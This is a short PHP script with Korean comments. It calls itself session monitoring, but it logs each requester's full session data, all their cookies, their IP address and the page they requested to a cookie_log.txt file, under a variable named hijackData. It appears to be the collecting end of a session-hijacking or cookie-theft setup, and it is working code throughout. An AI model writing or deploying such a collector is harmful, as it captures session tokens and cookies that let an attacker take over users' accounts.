<?php
session_start();
$logfile = "cookie_log.txt";

// 클라이언트에서 전송된 JSON 데이터 수신 및 디코딩
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

// 타임스탬프와 액션 값 설정
$timestamp = date('Y-m-d H:i:s');
$action = $data['action'] ?? 'monitor';

// 로그아웃 요청일 때와 일반 모니터링 요청일 때 구분
if ($action === 'logout') {
    // 로그아웃 상태 기록
    $logEntry = sprintf(
        "[%s] 로그아웃 감지\nIP: %s\n%s\n",
        $timestamp,
        $_SERVER['REMOTE_ADDR'],
        str_repeat('-', 50)
    );
} else {
    // 일반 세션 모니터링 로그 기록
    $hijackData = [
        'timestamp' => $timestamp,
        'session_data' => $_SESSION,
        'cookies' => $_COOKIE,
        'ip_address' => $_SERVER['REMOTE_ADDR'],
        'request_uri' => $_SERVER['REQUEST_URI']
    ];

    $logEntry = sprintf(
        "[%s]\nIP: %s\nPage: %s\nSession Data: %s\nCookies: %s\n%s\n",
        $hijackData['timestamp'],
        $hijackData['ip_address'],
        $hijackData['request_uri'],
        json_encode($hijackData['session_data'], JSON_PRETTY_PRINT),
        json_encode($hijackData['cookies'], JSON_PRETTY_PRINT),
        str_repeat('-', 50)
    );
}

// 로그 파일에 기록
$writeResult = file_put_contents($logfile, $logEntry, FILE_APPEND);

if ($writeResult === false) {
    error_log("Failed to write to log file: " . error_get_last()['message']);
}
?>